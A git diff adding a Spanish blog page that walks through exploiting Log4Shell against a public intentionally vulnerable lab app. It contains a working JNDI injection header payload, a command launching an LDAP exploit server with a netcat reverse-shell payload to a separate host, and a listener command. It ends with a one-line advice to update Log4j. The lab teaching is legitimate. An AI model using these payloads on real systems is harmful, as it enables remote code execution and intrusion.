@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Acerca de log4shell :: pacodiazdg.github.io</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.
+Como Funciona? Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable https://github.com/christophetd/log4shell-vulnerable-app
+git clone https://github." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://PacodiazDG.github.io/posts/acerca-de-log4shell/" />
+
+
+  
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://PacodiazDG.github.io/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://PacodiazDG.github.io/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://PacodiazDG.github.io/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Acerca de log4shell">
+<meta property="og:description" content="log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.
+Como Funciona? Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable https://github.com/christophetd/log4shell-vulnerable-app
+git clone https://github." />
+<meta property="og:url" content="https://PacodiazDG.github.io/posts/acerca-de-log4shell/" />
+<meta property="og:site_name" content="pacodiazdg.github.io" />
+
+  
+    <meta property="og:image" content="https://PacodiazDG.github.io/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-06-07 10:30:00 -0600 -0600" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="green">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    PacodiazDG
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://PacodiazDG.github.io/posts/acerca-de-log4shell/">Acerca de log4shell</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-06-07</time>
+    
+</div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://PacodiazDG.github.io/tags/java/">Java</a>&nbsp;
+      
+      #<a href="https://PacodiazDG.github.io/tags/backend/">Backend</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <p>log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j  se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.</p>
+<h3 id="como-funciona">Como Funciona?<a href="#como-funciona" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable <a href="https://github.com/christophetd/log4shell-vulnerable-app">https://github.com/christophetd/log4shell-vulnerable-app</a></p>
+<pre tabindex="0"><code>git clone https://github.com/christophetd/log4shell-vulnerable-app.git
+docker run --name vulnerable-log4 -p 8081:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+</code></pre><p><img alt="Name" src="/images/1d851fb4f2c85bf3e0498b263832fa16012931205a239a371f42cefc5ec6ca576036b9915ebd7849c48426f3c069cdcbb5b54bf2455dc724602eaca20ae1eb6c.png"></p>
+<p>una vez descargado vamos analizar el código para ver en qué forma puede ser vulnerable</p>
+<p><img alt="Name" src="/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png"></p>
+<p>La parte que nos interesa es:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#a6e22e">@GetMapping</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">index</span>(<span style="color:#a6e22e">@RequestHeader</span>(<span style="color:#e6db74">&#34;X-Api-Version&#34;</span>) String apiVersion) {
+</span></span><span style="display:flex;"><span>        logger.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;Received a request for API version &#34;</span> <span style="color:#f92672">+</span> apiVersion);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Hello, world!&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Y en especial esta ya que es la parte vulnerable :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>logger.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;Received a request for API version &#34;</span> <span style="color:#f92672">+</span> apiVersion);
+</span></span></code></pre></div><p>después vamos a necesitar un servidor LDAP que nos permita ejecutar los comandos  <a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<pre tabindex="0"><code>java -jar JNDI-Injection-1.0-SNAPSHOT-all.jar -C &#34;nc 172.17.0.1 4444 -e /bin/sh&#34; 
+nc -lvp 4444
+</code></pre><p><img alt="Name" src="/images/8b704fcf71dbb7ed35fde12e48b6702579dcea428aba4300bca4b2b8121304bec29426740971334b5fd1d2f67a0556bbd8e2256f623cffd925fceba73caaefed.png"></p>
+<p>Solo hacemos un http request con el header X-Api-Version y con la dirección que nos proporcionó JNDI Injection</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">192.168.1.141:8081</span>
+</span></span><span style="display:flex;"><span>X-Api-Version<span style="color:#f92672">:</span> <span style="color:#ae81ff">${jndi:ldap://172.17.0.1:1389/zlrpms} </span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p><img alt="Name" src="/images/d95ee3cf726654238c8d22e1bd33dc9ef77e30f140abd9200f28397d0bd713247747c1f2aa70d503c237969780ceac41b9e8311108044fc84c960710c28433f4.png"></p>
+<p><img alt="Name" src="/images/40068b8357a248e64f7103c590e433798614cc565f55a3d07a81a5ef5dbc868bac37cb6cc696f2495e53719253fe2ed82070cfa31e6b09ae7e8ada788d881be5.png"></p>
+<p>debido a que la vulnerabilidad ya se encuentra arreglada en las nuevas versiones de Log4j  solo queda actualizar</p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
